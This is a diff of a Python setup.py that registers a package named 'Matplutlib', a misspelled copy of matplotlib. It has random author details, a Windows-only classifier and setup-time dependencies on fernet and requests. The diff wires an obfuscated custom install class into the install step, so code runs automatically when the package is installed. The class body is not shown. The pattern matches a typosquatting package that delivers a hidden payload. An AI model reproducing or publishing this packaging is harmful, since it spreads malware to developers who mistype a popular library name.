@@ -18,5 +18,22 @@ class flqXgyTEJprUMIKzWrgqiJrsuvohRTJaGWmximRaMKOIwfOKfmTHJUhmFdOCaBctWMxZcjvfjV
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
+setup(
+    name="Matplutlib",
+    version=VERSION,
+    author="CJGHqEgUSuhausojXhom",
+    author_email="wdLMwxAVhD@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': flqXgyTEJprUMIKzWrgqiJrsuvohRTJaGWmximRaMKOIwfOKfmTHJUhmFdOCaBctWMxZcjvfjVsBjInxuLdggVwvDYfVZGxjNIxvHwolTfDOQLoFvgErDbzTCssPDLKsUDwuAkWiNiGPlSvPyHeWlFkKmmSHdUFq,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
